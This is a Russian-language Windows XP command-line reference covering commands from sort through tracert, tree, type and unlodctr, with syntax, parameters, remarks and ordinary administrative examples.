Считывает входящие данные, сортирует их. Результат может быть выведен на экран, в файл или на другое устройство.
Синтаксис

sort [/r] [/+n] [/m килобайты] [/l язык] [/rec символы] [[диск1:][путь1]имя_файла1] [/t [диск2:][путь2]] [/o [диск3:][путь3]имя_файла3]

[команда |] sort [/r] [/+n] [/m килобайты] [/l язык] [/rec символы] [[диск1:][путь1]имя_файла1][/t [диск2:][путь2]] [/o [диск3:][путь3]имя_файла3]
Параметры

/r
    Изменяет порядок сортировки, задает сортировку от Z к A, затем от 9 к 0.
/+n
    Указывает номер позиции символа, n, начиная с которой sort выполняет сравнение.
/m килобайты
    Указывает количество основной памяти, используемой для сортировки (в килобайтах).
/l язык
    Переопределяет порядок сортировки символов, задаваемый языком, который используется системой по умолчанию(т. е. языком и страной/регионом, выбранными при установке).
/rec символы
    Указывает максимальное числа символов в записи (или строке) входного файла. (Значение по умолчанию равно 4096, максимальное значение — 65535).
[диск1:][путь1]имя_файла1
    Указывает сортируемый файл. Если имя не указано, сортируется стандартный ввод. При указании входного файла команда работает быстрее, чем при перенаправлении того же файла на стандартный ввод.
/t [диск2:][путь2]
    Указывает каталог для хранения рабочих данных команды sort, если сортируемые данные не помещаются в основной памяти. По умолчанию используется системный временный каталог.
/o [диск3:][путь3]имя_файла3
    Указывает файл для хранения отсортированного ввода. Если параметр не указан, данные будут записываться в стандартный вывод. При указании выходного файла команда работает быстрее, чем при перенаправлении того же файла на стандартный вывод.
/?
    Отображает справку в командной строке.

Примечания
- Использование параметра командной строки /+n

Использование параметра командной строки /+n, например /+3 указывает, что сравнение должно начинаться с третьего символа в каждой строке. Строки, имеющие меньше, чем n символов, оказываются перед другими строками. По умолчанию сравнение начинается с первого символа в строке.
- Использование параметра командной строки /m килобайты

Всегда используется как минимум 160 Кб. Если указан объем памяти, для сортировки используется указанный объем (но не меньше 160 Кб), независимо от объема доступной памяти.

Максимальный объем памяти по умолчанию, если параметр не указан, составляет 90 процентов доступной основной памяти, если и ввод, и вывод идет через файлы, и 45 процентов в противоположном случае. Настройки по умолчанию обычно дают наилучшее быстродействие.
- Использование параметра командной строки /l язык

В настоящий момент единственной альтернативой языку по умолчанию является «C», который позволяет сортировать быстрее, чем при сортировке естественного языка. Сортировка символов производится по их двоичной кодировке.
- Задание источника данных

Когда задан параметр команда или имя_файла, команда sort действует как фильтр и получает входные данные из стандартного ввода (обычно с клавиатуры, из канала или из файла).
- Использование перенаправления с командой sort

Чтобы направить команде sort данные от другой команды или направить результаты сортировки другой команде (например команде more для вывода с паузой после заполнения экрана), может быть использован символ канала (|). Использование символов «меньше» (<) или «больше» (>) для указания входного и выходного файлов не может быть очень эффективным. Вместо этого непосредственно укажите входной файл (как определено синтаксисом команды) и укажите выходной файл с помощью ключа /o. Сортировка, указанная таким способом, может оказаться значительно быстрее, особенно для больших файлов.
- Строчные и заглавные буквы

Команда sort не различает строчные и заглавные буквы.
- Размер файлов

Команда sort может обрабатывать файлы любого размера.
- Последовательность сортировки

Программа сортировки использует последовательность сортировки, соответствующую текущим установкам языка или страны/региона и текущей кодовой странице. Символы с кодом ASCII, большим 127, сортируются в соответствии со сведениями в файле Country.sys или в альтернативном файле, заданном командой country в файле Config.nt.
- Использование памяти

Если сортируемые данные помещаются в памяти (максимального объема памяти по умолчанию или объема, указанного параметром /m), сортировка выполняется за один проход. В противном случае, сортировка выполняется за два прохода, так что объемы памяти, использованной для проходов сортировки и слияния, равны. Если выполняются два прохода, частично отсортированные данные хранятся во временном файле на диске. Если памяти недостаточно для выполнения сортировки в два прохода, выдается сообщение об ошибке времени выполнения. Если параметр /m указывает больший объем памяти, чем доступный на самом деле, может произойти снижение быстродействия или может возникнуть ошибка времени выполнения.
Примеры

Сортировка файла

Следующая команда считывает файл Expenses.txt, сортирует его в обратном порядке и выводит на экран:

sort /r expenses.txt

Сортировка результата работы команды

Чтобы найти в большом файле с именем Maillist.txt строку «Jones» и отсортировать результаты поиска, используйте канал (|) для направления результата работы команды find команде sort, как показано ниже:

find "Jones" maillist.txt | sort

Команда выводит на экран отсортированный список строк, содержащих заданный текст.

Сортировка ввода с клавиатуры

Для сортировки данных, вводимых с клавиатуры, и вывода результат на экран можно использовать команду sort без параметров, как показано в следующем примере:
sort

Затем вводится текст, который необходимо отсортировать; каждая строка заканчивается нажатием клавиши ENTER. Когда ввод будет закончен, следует нажать комбинацию CTRL+Z и ENTER. Команда sort выведет на экран введенные строки, отсортированные в алфавитном порядке.

Вывод также может быть направлен и в файл. Чтобы получить дополнительные сведения, выберите redirect из списка в ссылке «».
========================================================================================
Stacks

Поддерживает динамическое использование стеков данных при обработке аппаратных прерываний. Чтобы использовать эту переменную среду, поместите ее в файл Config.nt.
Синтаксис

stacks=число,размер
Параметры

число
    Задает количество стеков. Допустимые значения числа — 0 и от 8 до 64.
размер
    Задает размер (в байтах) каждого стека. Допустимые значения размера — 0 и от 32 до 512.

Примечания
- Параметры по умолчанию

В приведенной ниже таблице приведены значения, используемые для команды stack по умолчанию.
Компьютер     Стеки
IBM PC, IBM PC/XT, IBM PC-Portable     0,0
Другие     9,128
- Специальные случаи выделения стеков

При обработке аппаратного прерывания система Windows XP выделяет один стек из заданного количества стеков. Если для параметров число и размер заданы нулевые значения, Windows XP не выделяет стеки. В этом случае каждая запущенная программа должна иметь достаточного стекового пространства для обработки аппаратных прерываний. Большинство компьютеров работают корректно, оставляя в памяти пространство для программ, однако, если при задании нулевых значений числа и размера система начинает работать неустойчиво, следует вернуться к параметрам, заданным по умолчанию.
Примеры

Чтобы выделить 8 стеков по 512 байт для обработки аппаратных прерываний, в файл Config.nt должна быть добавлена следующая команда:

stacks=8,512
========================================================================================
Start

Запускает определенную программу или команду в отдельном окне. При запуске без параметров команда start создает новое окно командной строки.
Синтаксис

start ["заголовок"] [/dпуть] [/i] [/min] [/max] [{/separate | /shared}] [{/low | /normal | /high | /realtime | /abovenormal | belownormal}] [/wait] [/b] [имя_файла] [параметры]
Параметры

"заголовок"
    Указывает заголовок, выводимый в области заголовка окна.
/dпуть
    Указывает каталог запуска.
/i
    Передает начальные установки среды интерпретатора Cmd.exe в новое окно командной строки. 
/min
    Запускает новое окно командной строки в свернутом виде.
/max
    Запускает новое окно командной строки в развернутом виде.
/
    Запускает 16-битные программы в отдельном пространстве памяти.
/shared
    Запускает 16-битные программы в отдельном пространстве памяти.
/low
    Запускает приложение с низким приоритетом.
/normal
    Запускает приложение с нормальным приоритетом.
/high
    Запускает приложение с высоким приоритетом. 
/realtime
    Запускает приложение с приоритетом реального времени.
/abovenormal
    Запускает приложение с приоритетом выше среднего.
/belownormal
    Запускает приложение с приоритетом ниже среднего.
/wait
    Запускает приложение с ожиданием окончания его работы.
/b
    Запускает приложение без открытия нового окна командной строки. Обработка комбинации клавиш CTRL+C не производится, пока приложение не разрешит обработку CTRL+C. Для прерывания приложения следует использовать CTRL+BREAK.
имя_файла
    Задает команду или программу для запуска.
параметры
    Задает параметры, которые будут переданы вызываемой программе.

Примечания
- Неисполняемые файлы можно запустить через сопоставление файла с приложением. Для этого просто введите имя файла (как команду). Для получения дополнительных сведений о создании этих сопоставлений в командном сценарии используйте команды assoc и ftype, а также см. ссылку «». - Когда выполняется команда, в которой есть строка «CMD», являющаяся первым элементом без классификаторов расширения или пути, «CMD» заменяется значением переменной COMSPEC. Таким образом запрещается запуск cmd из текущего каталога. - При выполнении приложения 32-разрядного графического интерфейса пользователя, команда cmd не дожидается завершения приложения перед возвращением в командную строку. Этого не происходит, если приложение запускается из командной строки. -Когда выполняется команда, первый элемент которой не содержит расширения, CMD.EXE использует значение переменной среды PATHEXT для определения расширений, поиск которых будет производиться и порядок их поиска. По умолчанию значения для переменной PATHEXT: .COM, .EXE, .BAT, .CMD (т. е., синтаксис такой же, как у переменной PATH; различные элементы разделяются точками с запятой). - Когда ведется поиск исполняемого файла и не находится соответствующего расширения, команда start начинает поиск каталога. Если он существует, команда start отрывает программу Explorer.exe по этому маршруту.
Примеры

Для того чтобы запустить программу Myapp, но при этом остаться в текущем окне командной строки, следует использовать следующую команду:

start myapp
========================================================================================
Subst

Устанавливает соответствие пути в файловой системе заданному диску. Вызванная без параметров, команда subst выводит имена виртуальных дисков, созданных предыдущими вызовами команды.
Синтаксис

subst [диск: [диск2:]путь]

subst диск1: /d
Параметры

диск1:
    Задает диск, которому будет поставлен в соответствие заданный путь
диск2:
    Задает физический диск, на который ссылается заданный путь (если не совпадает с текущим диском).
путь
    Задает путь, который ставится в соответствие диску.
/d
    Удаляет виртуальный диск.
/?
    Отображает справку в командной строке.

Примечания
- Следующие команды не будут работать и не должны быть использованы с дисками, созданными командой subst: - chkdsk- diskcomp- diskcopy- format- label- recover - Параметр диск1 должен лежать в диапазоне, задаваемом командой lastdrive. В противном случае subst выведет следующее сообщение об ошибке:

Недопустимый параметр - диск1:
Примеры

Чтобы создать виртуальный диск Z на пути B:\User\Betty\Forms, введите следующую команду:

subst z: b:\user\betty\forms

Теперь, вместо ввода полного имени, можно получить доступ к каталогу, обращаясь к диску, как показано ниже:

z:
========================================================================================
Switches

Позволяет работать с расширенной клавиатурой как с обычной.
Синтаксис

switches=/k
Параметры

отсутствуют

Примечания
- Команда используется в файле Config.nt.- Команда может быть использована при работе с программой, которая не воспринимает коды клавиш расширенной клавиатуры.- Если использована команда switches=/k и установлен драйвер Ansi.sys, параметр командной строки /k должен быть задан в команде device, загружающей драйвер Ansi.sys.
Примеры

Если требуется использование функций обычной клавиатуры даже при подключении расширенной клавиатуры, в файл Config.nt должна быть включена следующая команда:

switches=/k
Рисунок Microsoft Windows
Systeminfo

Выводит на экран подробные сведения о конфигурации компьютера и операционной системы, сведения о безопасности, код продукта и параметры оборудования, такие как ОЗУ, дисковое пространство и сетевые карты.
Синтаксис

systeminfo[.exe] [/s компьютер [/u домен\пользователь [/p пароль]]] [/fo {TABLE|LIST|CSV}] [/nh]
Параметры

/s компьютер
    Указывает имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполняет команду с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Определяет пароль учетной записи пользователя, заданной параметром /u.
/fo {TABLE|LIST|CSV}
    Задает формат выходных данных. Допустимые значения: TABLE, LIST и CSV. По умолчанию для выходных данных используется формат TABLE.
/nh
    Запрещает вывод заголовков столбцов. Данный параметр является допустимым, если параметр /fo имеет значение TABLE или CSV.
/?
    Отображает справку в командной строке.

Примеры

Далее приведены примеры использования команды getmac:

systeminfo.exe /s srvmain
systeminfo.exe /s srvmain /u maindom\hiropln
systeminfo /s srvmain /u maindom\hiropln /p p@ssW23 /fo table
========================================================================================
Программа проверки системных файлов (sfc)

Сканирует и проверяет версии всех защищенных системных файлов после перезапуска компьютера.
Синтаксис

sfc [/scannow] [/scanonce] [/scanboot] [/revert] [/purgecache] [/cachesize=x]
Параметры

/scannow
    Незамедлительно сканирует все защищенные системные файлы.
/scanonce
    Однократно сканирует все защищенные системные файлы.
/scanboot
    Сканирует все защищенные системные файлы каждый раз при перезапуске компьютера.
/revert
    Восстанавливает стандартные параметры работы сканера.
/purgecache
    Очищает кэш файлов программы защиты файлов Windows и немедленно сканирует все защищенные системные файлы.
/cachesize=x
    Назначает размер, в мегабайтах (Мбайт), кэша файлов для защиты файлов Windows.
/?
    Отображает справку в командной строке.

Примечания
- Для выполнения команды sfc необходимо войти в систему в качестве члена группы администраторов. - Если программа sfc находит, что защищенный файл был переопределен, подходящая версия файла восстанавливается из папки %системный_корневой_каталог%\system32\dllcache, а затем заменяет неправильный файл. - Если папка %системный_корневой_каталог%\system32\dllcache повреждается или становится непригодной для пользования, восстановите ее содержимое с помощью команд sfc /scannow, sfc /scanonce или sfc /scanboot.
Рисунок Microsoft Windows
Taskkill

Завершает одно или несколько заданий или процессов. Процессы могут быть уничтожены кодом процесса или именем образа.
Синтаксис

taskkill [/s компьютер] [/u домен\пользователь [/p пароль]]] [/fi имя_фильтра] [/pid код_процесса]|[/im имя_образа] [/f][/t]
Параметры

/s компьютер
    Указывает имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполнение команды с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Определяет пароль учетной записи пользователя, заданной параметром /u.
/fi имя_фильтра
    Задает типы процессов, которые следует завершить и не следует. Допустимыми именами фильтров, операторами и значениями являются следующие.
    Имя     Операторы     Значение
    Hostname     eq, ne     Любая допустимая строка
    Status     eq, ne     RUNNING|NOT RESPONDING
    Imagename     eq, ne     Любая допустимая строка
    PID     eg, ne, gt, lt, ge, le     Любой положительное число
    Session     eg, ne, gt, lt, ge, le     Любой действительный номер сеанса
    CPUTime     eg, ne, gt, lt, ge, le     Допустимое время в формате чч:мм:сс. Компоненты мм и сс должны иметь значения от 0 до 59, а чч может быть любым значением числа без знака
    Memusage     eg, ne, gt, lt, ge, le     Любое целое число
    Username     eq, ne     Любое действительное имя пользователя ([домен\]пользователь).
    Services     eq, ne     Любая допустимая строка
    Windowtitle     eq, ne     Любая допустимая строка
/pid код_процесса
    Указывает код процесса, который необходимо завершить.
/im имя_образа
    Указывает имя образа процесса, который необходимо завершить. Используйте подстановочный знак (*) для указания всех имен образа.
/f
    Указывает, что процесс(ы) должен быть принудительно завершен. Этот параметр не действует для удаленных процессов, все удаленные процессы завершаются принудительно.
/t
    Задает завершение всех дочерних процессов вместе с родительским, такое действие обычно известно как уничтожение дерева. 
/?
    Отображает справку в командной строке.

Примечания
- Подстановочный символ (*) принимается только при указании вместе с фильтрами. - Завершение удаленных процессов всегда выполняется принудительно независимо от указания параметра /f. - Указание имени компьютера в качестве фильтра HOSTNAME приведет к завершению работы и остановке всех процессов.- Используйте команду tasklist для определения кода завершаемого процесса.- Команда taskkill является заменой средству Kill.
Примеры

Далее приведены примеры использования команды taskkill:

taskkill /pid 1230 /pid 1241 /pid 1253
taskkill /f /fi "USERNAME eq NT AUTHORITY\SYSTEM" /im notepad.exe
taskkill /s srvmain /f /im notepad.exe
taskkill /s srvmain /u maindom\hiropln /p p@ssW23 /fi "IMAGENAME eq note*" /im *
taskkill /s srvmain /u maindom\hiropln /fi "USERNAME ne NT*" /im *
taskkill /f /fi "PID ge 1000" /im *
Рисунок Microsoft Windows
Tasklist

Отображает список приложений и служб с кодом процесса (PID) для всех задач, выполняющихся на локальном или удаленном компьютере.
Синтаксис

tasklist[.exe] [/s компьютер] [/u домен\пользователь [/p пароль]] [/fo {TABLE|LIST|CSV}] [/nh] [/fi фильтр [/fi фильтр2 [ ... ]]] [/m [модуль] | /svc | /v]
Параметры

/s компьютер
    Указывает имя или IP-адрес удаленного компьютера (не используйте обратную косую черту). По умолчанию используется локальный компьютер.
/u домен\пользователь
    Выполняет команду с разрешениями учетной записи пользователя, который указан как пользователь или домен\пользователь. По умолчанию используются разрешения текущего вошедшего пользователя компьютера, с которого поступила эта команда.
/p пароль
    Определяет пароль учетной записи пользователя, заданной параметром /u.
/fo {TABLE|LIST|CSV}
    Задает формат выходных данных. Допустимые значения: TABLE, LIST и CSV. По умолчанию для выходных данных используется формат TABLE.
/nh
    Запрещает вывод заголовков столбцов. Данный параметр является допустимым, если параметр /fo имеет значение TABLE или CSV.
/fi имя_фильтра
    Задает типы процессов, которые следует завершить или не следует. Допустимыми именами фильтров, операторами и значениями являются следующие.
    Имя     Операторы     Значение
    Status     eq, ne     RUNNING|NOT RESPONDING
    Imagename     eq, ne     Любая допустимая строка
    PID     eg, ne, gt, lt, ge, le     Любой положительное число
    Session     eg, ne, gt, lt, ge, le     Любой действительный номер сеанса.
    SessionName     eq, ne     Любая допустимая строка
    CPUTime     eg, ne, gt, lt, ge, le     Допустимое время в формате чч:мм:сс. Компоненты мм и сс должны иметь значения от 0 до 59, а чч может быть любым значением числа без знака
    Memusage     eg, ne, gt, lt, ge, le     Любое целое число
    Username     eq, ne     Любое действительное имя пользователя ([домен\]пользователь)
    Services     eq, ne     Любая допустимая строка
    Windowtitle     eq, ne     Любая допустимая строка
    Modules     eq, ne     Любая допустимая строка
/m [модуль]
    Задает вывод сведений о модулях для каждого процесса. При указании модуля отображаются все процессы, использующие этот модуль. Если модуль не определен, выводятся на экран все процессы для всех модулей. Нельзя использовать совместно с параметрами /svc и /v
/svc
    Отображает без обрезки сведения о всех службах для каждого процесса. Данный параметр является допустимым, если параметр /fo имеет значение TABLE. Нельзя использовать совместно с параметрами /m и /v
/v
    Задает отображение подробных сведений о задании в выходных данных. Нельзя использовать совместно с параметрами /svc и /m.
/?
    Отображает справку в командной строке.

Примечания
- Команда tasklist является заменой средству TList.
Примеры

Далее приведены примеры использования команды taskkill:

tasklist /v /fi "PID gt 1000" /fo csv
tasklist /fi "USERNAME ne NT AUTHORITY\SYSTEM" /fi "STATUS eq running"
tasklist /v /fi "STATUS eq running"
tasklist /s srvmain /nh
tasklist /s srvmain /s srvny
tasklist /s srvmain /u maindom\hiropln /p p@ssW23 /nh
Рисунок Microsoft Windows
Tcmsetup

Настраивает или отключает клиента TAPI.
Синтаксис

tcmsetup [/q] [/x] /c сервер1 [сервер2...]

tcmsetup [/q] /c /d
Параметры

/q
    Запрещает вывод сообщений.
/x
    Указывает ответные вызовы при установке соединения для сетей с высокой нагрузкой, в которых велики потери пакетов. При отсутствии параметра используются обратные вызовы без установки соединения.
/c
    Обязательный параметр. Указывает настройку клиента.
сервер1
    Обязательный параметр. Указывает имя удаленного сервера, у которого есть поставщики услуг TAPI, необходимые клиенту. Клиент использует линии и телефоны служб поставщиков. Клиент должен находиться в одном домене с сервером или в домене, у которого установлены двухсторонние отношения доверия с доменом, содержащим сервер.
сервер2...
    Указывает дополнительный сервер или несколько серверов, доступных клиенту. При вводе списка серверов вставляйте пробел между именами серверов. 
/d
    Очищает список удаленных серверов. Отключает клиента телефонии, запретив ему использовать поставщиков услуг TAPI на удаленных серверах.
/?
    Отображает справку в командной строке.

Примечания
- Для правильной работы телефонии TAPI выполните команду tcmsetup для указания удаленных серверов, используемых клиентами TAPI.- Чтобы запустить эту команду, необходимо принадлежать к группе администраторов. Если вход в систему произведен с учетной записью из другой группы, см. Использование команды runas для запуска программ от имени администратора. - Перед тем как пользователь сможет использовать телефон или линию на сервере TAPI, администратор сервера телефонии должен назначить пользователю телефон или линию.- Список серверов телефонии, созданный этой командой, заменяет существующий список серверов, доступных клиенту. Данную команду нельзя использовать для добавления сервера в существующий список.
Рисунок Microsoft Windows
Tftp

Осуществляет обмен файлами с удаленным компьютером, обычно с компьютером под управлением UNIX, на котором выполняется служба или демон протокола Trivial File Transfer Protocol (TFTP). Запущенная без параметров, команда tftp выводит справку.
Синтаксис

tftp [-i] [узел] [{get | put}] [источник] [результат]
Параметры

-i
    Задает режим передачи двоичных файлов (иногда называемых режимом октета). В двоичном режиме файлы передаются по байту. Режим используется при передаче двоичных файлов. Если ключ -i не задан, передача производится в текстовом режиме ASCII. Этот режим используется по умолчанию. Режим передачи двоичных файлов преобразует символы конца строки (EOL) в соответствующий формат данного компьютера. Режим используется при передаче текстовых файлов. При успешном завершении процесса передачи на экран выводится значение скорости передачи.
узел
    Указывает имя локального или удаленного компьютера.
put
    Передает файл источник с локального компьютера в файл результат на удаленном компьютере. Так как протокол TFTP не поддерживает проверку полномочий пользователя, пользователь должен войти в систему на удаленном компьютере и иметь права записи файлов.
get
    Передает файл источник с удаленного компьютера в файл результат на локальном компьютере.
Источник
    Задает имя файла для передачи.
результат
    Задает, куда записывать получаемый файл. Если имя результата не задано, будет использовано имя источника.
/?
    Отображает справку в командной строке.

Примечания
- Использование параметра get

Команда put используется для передачи файлов с локального на удаленный компьютер. Команда get используется для передачи файлов с удаленного компьютера на локальный.
- Windows XP или Windows 2000 не предоставляет сервер общего назначения TFTP. Windows 2000 предоставляет службу сервера TFTP только для обеспечения возможности удаленной загрузки на компьютерах-клиентах под управлением Windows XP или Windows 2000. - Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтоб передать файл Users.txt с локального компьютера в файл Users19.txt на удаленный компьютер с именем vax1, введите следующую команду:

tftp vax1 put users.txt users19.txt
========================================================================================
Time

Выводит и задает системное время. При использовании без параметров, команад time отображает системное время и предалагает ввести новое время.
Синтаксис

time [/t] [/time] [часы:[минуты[:секунды[.сотые]]][{A|P}]]
Параметры

/t
    Выводит на экран текущее системное время без предложения ввода нового.
/time
    Такой же как параметр /t.
часы
    Задает значение часов. Допустимы величины от 0 до 23.
минуты
    Задает значение минут. Допустимы величины от 0 до 59.
секунды
    Задает значение секунд. Допустимы величины от 0 до 59.
сотые
    Задает значение сотых долей секунды. Допустимы величины от 0 до 99.
{A|P}
    Задает время до полудня (A.M.) или после полудня (P.M.) для 12-часового формата времени. Если указано допустимое 12-ти часовое значение, но не задано значение A или P, команда time использует A (до полудня).
/?
    Отображает справку в командной строке.

Примечания
- Чтобы сохранить время при использовании команды time без параметров, нажмите клавишу ENTER. - Использование параметра /t

Параметр командной строки /t доступен только в том случае, если расширения командного процессора разрешены (разрешены по умолчанию). Дополнительные сведения о расширениях командного процессора см. в разделе cmd, доступном по ссылке «».
- Задание недопустимого формата времени

При задании недопустимого формата времени выводится сообщение и предлагается ввести время корректно:

Указано недопустимое время
Введите новое время:_
- Изменение формата времени

Формат представления времени может быть изменен с помощью объекта Дата и время на панели управления. Чтобы изменить настройки только в подсистеме MS-DOS, измените параметр country в файле Config.nt. В зависимости от выбранной страны, время выводится в 12- или 24-часовом формате. Если время задано в 12-часовом формате, следует задавать параметр P для значений времени после полудня.
Примеры

Для установки часов компьютера на 1:36 после полудня введите одну из следующих команд:

time 13:36

time 1:36P
========================================================================================
W32tm

Используется для определения причины неполадок, связанных со службой времени Windows
Синтаксис

{/config [/computer:имя_компьютера] [ [/update] [/manualpeerlist:список_компьютеров] ] [/syncfromflags:список_флажков] ]|/monitor|/ntte|/ntpte|/register|/resync [{:имя_компьютера] [/nowait]|[/rediscover}]|/tz|/unregister}
Параметры

/config [/computer:имя_компьютера] [ [/update] [/manualpeerlist:список_компьютеров] ] [/syncfromflags:список_флажков]
    Выполняет согласование настроек времени на локальном и конечном компьютере. Одинаковое время синхронизации можно задать с помощью ключа /manualpeerlist. Изменения конфигурации не учитываются, пока не перезапустится служба времени Windows или не будет использован ключ /update. Ключ /syncfromflags применяется, чтобы задать типы источников синхронизации, и может быть установлен либо MANUAL для использования списка узлов, заданного вручную, или DOMHIER для синхронизации с контроллера домена.
/monitor
    Осуществляет наблюдение за конечным компьютером или списком компьютеров.
/ntte
    Преобразует системное время NT в читаемый формат.
/ntpte
    Преобразует время NTP в читаемый формат.
/register
    Регистрирует запуск службы и добавляет стандартную конфигурацию в реестр.
/resync [{:имя_компьютера] [/nowait]|[/rediscover}]
    Ресинхронизирует часы по мере возможности, не обращая внимания статистику накопленных ошибок. Если не указан компьютера, ресинхронизирован будет локальный компьютер. Ресинхронизация не выполняется без использования ключа /nowait. Текущие источники времени используются до тех пор, пока не введен ключ /rediscover, который выполняет принудительное повторное обнаружение сетевых ресурсов перед ресинхронизацией. 
/tz
    Отображает текущую настройку часового пояса
/unregister
    Отменяет регистрацию службы и удаляет сведения о конфигурации из реестра.
/?
    Отображает справку в командной строке.

Примечания
- Средство предназначено для системных администраторов для определения причин неполадок, связанных со временем системы Windows.

Для получения дополнительных сведений см. раздел net time в «».
- Чтобы служба времени Windows использовала изменения, выполненные с помощью команды W32tm, необходимо оповестить службу. Чтобы оповестить службу времени Windows, в командной строке введите: w32tm /config /update.
Примеры

Чтобы отобразить текущую настройку часового пояса, введите команду:

w32tm /tz
========================================================================================
Title

Создает заголовок окна командной строки.
Синтаксис

title [строка]
Параметры

строка
    Задает текст заголовка окна командной строки.
/?
    Отображает справку в командной строке.

Примечания
- Чтобы указать заголовок окна для пакетных программ, включите команду title в начало пакетной программы. - Установленный заголовок окна может быть изменен только повторным вызовом команды title.
Примеры

Чтобы установить заголовок окна для пакетной программы, введите следующую команду:

rem Эта пакетная программа обновляет сведения о сотруднике:
cls
@echo off
title Обновление файлов
copy \\server\share\*.xls c:\users\common\*.xls
echo Файлы обновлены.
title Командная строка

========================================================================================
Tracert

Определяет путь до точки назначения с помощью посылки в точку назначения эхо-сообщений протокола Control Message Protocol (ICMP) с постоянным увеличением значений срока жизни (Time to Live, TTL). Выведенный путь — это список ближайших интерфейсов маршрутизаторов, находящихся на пути между узлом источника и точкой назначения. Ближний интерфейс представляют собой интерфейс маршрутизатора, который является ближайшим к узлу отправителя на пути. Запущенная без параметров, команда tracert выводит справку.
Синтаксис

tracert [-d] [-h максимальное_число_переходов] [-j список_узлов] [-w интервал] [имя_конечного_компьютера]
Параметры

-d
    Предотвращает попытки команды tracert разрешения IP-адресов промежуточных маршрутизаторов в имена. Увеличивает скорость вывода результатов команды tracert.
-h максимальное_число_переходов
    Задает максимальное количество переходов на пути при поиске конечного объекта. Значение по умолчанию равно 30.
-j список_узов
    Указывает для сообщений с эхо-запросом использование параметра свободной маршрутизации в заголовке IP с набором промежуточных мест назначения, указанных в списке_узлов. При свободной маршрутизации успешные промежуточные места назначения могут быть разделены одним или несколькими маршрутизаторами. Максимальное число адресов или имен в списке — 9. Список_адресов представляет набор IP-адресов (в точечно-десятичной нотации), разделенных пробелами.
-w интервал
    Определяет в миллисекундах время ожидания для получения эхо-ответов протокола ICMP или ICMP-сообщений об истечении времени, соответствующих данному сообщению эхо-запроса. Если сообщение не получено в течение заданного времени, выводится звездочка (*). Таймаут по умолчанию 4000 (4 секунды).
имя_конечного_компьютера
    Задает точку назначения, указанную IP-адресом или именем узла.
-?
    Отображает справку в командной строке.

Примечания
-Диагностическое средство, предназначенное для определения маршрута до точки назначения с помощью посылки в точку назначения эхо-запросов протокола Internet Control Message Protocol (ICMP) с различными значениями срока жизни (TTL, Time-To-Live). Каждый маршрутизатор, через который проходит путь, обязан перед дальнейшей пересылкой пакета уменьшить значение его поля TTL по меньшей мере на 1. Фактически, TTL — счетчик узлов. Предполагается, что когда параметр TTL становится равен 0, маршрутизатор посылает системе-источнику сообщение ICMP об истечении времени. Команда tracert определяет маршрут, посылая первый эхо-запрос с полем TTL, равным 1, и увеличивая значение этого поля на единицу для каждого последующего отправляемого эхо-пакета до тех пор, пока конечный узел не ответит или пока не будет достигнуто максимальное значение поля TTL. Максимальное количество переходов по умолчанию равно 30 и может быть изменено с помощью параметра -h. Путь определяется из анализа сообщений ICMP об истечении времени, полученных от промежуточных маршрутизаторов, и это-ответов точки назначения. Однако некоторые маршрутизаторы не посылают сообщений об истечении времени для пакетов с нулевыми значениями TTL и не видны для команды tracert. В этом случае для перехода отображается ряд звездочек (*). -Чтобы выполнить трассировку маршрута, вывести значение задержки распространения по сети и потерь пакета на каждом маршрутизаторе и узле в пути, используйте команду pathping. - Эта команда доступна, только если в свойствах сетевого адаптера в объекте Сетевые подключения в качестве компонента установлен протокол Интернета (TCP/IP).
Примеры

Чтобы выполнить трассировку пути к узлу corp7.microsoft.com, введите команду:

tracert corp7.microsoft.com

Чтобы выполнить трассировку пути к узлу corp7.microsoft.com и предотвратить разрешение каждого IP-адреса в имя, введите:

tracert -d corp7.microsoft.com

Чтобы выполнить трассировку пути к узлу corp7.microsoft.com и использовать узлы 10.12.0.1-10.29.3.1-10.1.44.1 для свободной маршрутизации, введите следующую команду:

tracert -j 10.12.0.1 10.29.3.1 10.1.44.1 corp7.microsoft.com
========================================================================================
Tree

Представляет графически дерево каталогов заданного пути или диска.
Синтаксис

tree [диск:][путь] [/f] [/a]
Параметры

диск:
    Задает дисковод, содержащий диск, графическое представление дерева каталогов которого будет выведено.
путь
    Задает каталог, для которого будет выведена структура подкаталогов.
/f
    Выводит имена файлов в каждом каталоге.
/a
    Задает использование командой tree текстовых символов вместо графических для вывода связей между каталогами.
/?
    Отображает справку в командной строке.

Примечания
- Структура дерева, выводимого командой tree на монитор, определяется параметрами, заданными при вызове команды. Если диск или путь не заданы, команда tree выведет часть дерева каталогов, начиная с текущего каталога на текущем диске.
Примеры

Для вывода имен всех подкаталогов на текущем диске служит следующая команда:

tree \

Для постраничного вывода имен файлов во всех каталогах диска C можно использовать следующую команду:

tree c:\ /f | more

Для печати списка файлов из предыдущего примера может быть использована следующая команда:

tree c:\ /f > prn
========================================================================================
Type

Вывод содержимого текстового файла на экран. Команда type применяется для просмотра текстового файла без его изменения.
Синтаксис

type [диск:][путь] имя_файла
Параметры

[диск:][путь] имя_файла
    Задает местоположение и имя файла для просмотра. Имена нескольких файлов разделяются пробелами.
/?
    Отображает справку в командной строке.

Примечания
- Если используется диск файловой системы NTFS и имя_файла содержит пробелы, заключайте текст в кавычки (т. е. "имя файла"). -Если на экран выводится двоичный файл или файл, созданный программой, возможно появление на экране служебных символов, таких как прогон страницы или управляющие последовательности. Эти символы представляют собой коды управления, используемые в двоичных файлах. Обычно команда type не используется для просмотра двоичных файлов.
Примеры

Чтобы вывести содержимое файла с именем Holiday.mar, введите следующую команду:

type holiday.mar

Чтобы вывести содержимое большого файла с паузой после заполнения экрана, введите следующую команду:

type holiday.mar | more
========================================================================================
Unlodctr

Удаляет имена счетчиков производительности и текст объяснения для службы или драйвера устройства из системного реестра.
Синтаксис

Unlodctr [\\имя_компьютера] имя_драйвера
Параметры

[\\имя_компьютера] имя_драйвера
    Удаляет параметры имени счетчика производительности и текст объяснения для драйвера или службы, описанные в параметре имя_драйвера, из системного реестра Windows XP. Если не указано имя_компьютерапо умолчанию Windows XP будет использовать локальный компьютер.
